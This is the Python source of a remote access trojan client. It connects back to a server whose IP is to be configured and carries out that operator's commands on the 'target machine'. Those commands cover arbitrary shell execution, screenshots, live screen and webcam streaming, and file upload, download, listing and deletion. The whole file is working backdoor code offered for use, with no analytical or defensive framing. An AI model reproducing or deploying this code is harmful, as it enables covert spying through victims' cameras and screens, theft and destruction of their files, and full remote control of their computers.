#copyright © 2019-2024 manoharkakumani
import socket
import os
import subprocess
import shutil
import pickle
import struct
import pyautogui
import cv2
import numpy
from PIL import ImageGrab

#global variables

sock = socket.socket()
host = '127.0.0.1' #change this to the ip address of the server
port = 9999

def bind_socket():
    global host
    global port
    try:
        sock.connect((host, port))
    except:
        bind_socket()

# shell function able to run shell commands on the target machine
def intract_with_shell(data,conn):
    try:
        if data[:2]== 'cd':
            os.chdir(data[3:])
        if len(data) > 0:
            cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            conn.send(str.encode(output_str + currentWD))
    except Exception as e:
        conn.send(e.encode("utf-8"))

# screen shot function to take screen shot 
def take_screenshot(conn):
    try:
        conn.send(('OK').encode("utf-8"))
        pic = pyautogui.screenshot()
        pic.save('myssdd.png')
        fup('myssdd.png',conn)
        os.unlink('myssdd.png')
    except Exception as e:
        conn.send(e.encode("utf-8"))

# screen streaming function to stream the screen 
def screen_streaming(conn): 
    try:
        conn.send(('OK').encode("utf-8"))
        while True:
            if conn.recv(4096).decode('utf-8')=="sst":
                frame =numpy.array(ImageGrab.grab())
                result, frame = cv2.imencode('.jpg', frame)
                data = pickle.dumps(frame, 0)
                size = len(data)
                conn.sendall(struct.pack(">L", size) + data)
            else:
                break
        return
    except Exception as e:
        conn.send(e.encode("utf-8"))

# camera function to access the camera 
def access_camera(conn):
    try:
        conn.send(('OK').encode("utf-8"))
        cam = cv2.VideoCapture(0)
        if cam :
            conn.send(('cam').encode("utf-8"))
            while True:
                if conn.recv(4096).decode('utf-8')=="cam":
                    ret, frame = cam.read()
                    result, frame = cv2.imencode('.jpg', frame)
                    data = pickle.dumps(frame,0)
                    conn.sendall(struct.pack(">L", len(data)) + data)
                else:
                    cam.release()
                    break
            return
        else:
            conn.send(('No camera Found').encode("utf-8"))
    except Exception as e:
        conn.send(e.encode("utf-8"))
    
# list files in the directory
def list_files(conn):
    try:
        arr = pickle.dumps(os.listdir())
        conn.send(arr)
    except:
        conn.send(('Error').encode("utf-8"))

# change directory
def change_directory(conn):
    try:
        conn.send((os.getcwd()).encode("utf-8"))
        x=conn.recv(1024).decode("utf-8")
        if x=='Y':
           dire=conn.recv(1024).decode("utf-8")
           os.chdir(dire)
           conn.send((os.getcwd()).encode("utf-8"))
        else:
            return
    except:
        conn.send(('Error').encode("utf-8"))
    
#accept file from server
def accept_file(filename,conn):
    try:
        data = conn.recv(1024).decode("utf-8")
        if data[:6] == 'EXISTS':
            filesize = data[6:]
            conn.send("OK".encode("utf-8"))
            f = open(filename, 'wb')
            data = (conn.recv(1024))
            totalRecv = len(data)
            f.write(data)
            while int(totalRecv) < int(filesize):
                data = conn.recv(1024)
                totalRecv += len(data)
                f.write(data)
            f.close()
    except:
        conn.send(('Error').encode("utf-8"))

#send file
def send_file(filename, conn):
    if os.path.isfile(filename):
        conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
        filesize=int(os.path.getsize(filename))
        userResponse = conn.recv(1024).decode("utf-8")
        if userResponse[:2] == 'OK':
            with open(filename, 'rb') as f:
                bytesToSend = f.read(1024)
                conn.send(bytesToSend)
                totalSend=len(bytesToSend)
                while int (totalSend) < int(filesize):
                    bytesToSend = f.read(1024)
                    totalSend += len(bytesToSend)
                    conn.send(bytesToSend)
    else:
        conn.send("ERROR".encode("utf-8"))

# delete files
def delete_file(fname,conn):
    try:
        if os.path.isfile(fname):
            os.unlink(fname)
        elif os.path.isdir(fname):
            shutil.rmtree(fname)
        else:
            conn.send("ERROR".encode("utf-8"))
        conn.send("Success".encode("utf-8"))
    except Exception as e:
        conn.send(e.encode("utf-8"))

function_dict ={
    'cmd': intract_with_shell,
    'fdown': accept_file,
    'fup': send_file,
    'cdir': change_directory,
    'flist': list_files,
    'fdel': delete_file,
    'sshot': take_screenshot,
    'cam': access_camera,
    'sst': screen_streaming
}

#main
bind_socket()
while True:
    data = (sock.recv(1024)).decode("utf-8").split('~')
    if data[0] in function_dict:
        function_dict[data[0]](data[1],sock)
    elif data[0]=='cwd':
        sock.send((os.getcwd()).encode("utf-8"))
    elif data[0]=='exit':
        break
    else:
        sock.send(".".encode('utf-8'))
